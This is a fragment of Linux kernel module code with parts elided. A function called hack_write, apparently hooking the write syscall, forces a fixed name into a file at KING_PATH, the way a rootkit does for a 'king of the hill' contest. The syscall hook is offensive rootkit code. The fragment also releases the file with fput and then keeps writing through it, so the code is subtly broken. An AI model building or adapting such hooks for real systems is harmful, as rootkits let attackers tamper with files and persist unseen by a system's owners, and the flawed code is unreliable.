...
static asmlinkage long hack_write(unsigned int fd, const char __user *buf, size_t count) {
    ...
    file = fget(fd);
    if (file != NULL) {
        file_path_struct = file->f_path;
        path_get(&file_path_struct); // Increase reference count
        tmp = d_path(&file_path_struct, file_path, sizeof(file_path));
        fput(file);
        if (strcmp(tmp, KING_PATH) == 0) {
            erro = kernel_write(file, (void *)KING_NAME, len, &pos);
            if (erro < 0) {
                printk(KERN_INFO "We're cooked\n");
                path_put(&file_path_struct); // Decrease reference count
                return erro;
            }
            printk(KERN_INFO "king is being written\n");
            path_put(&file_path_struct); // Decrease reference count
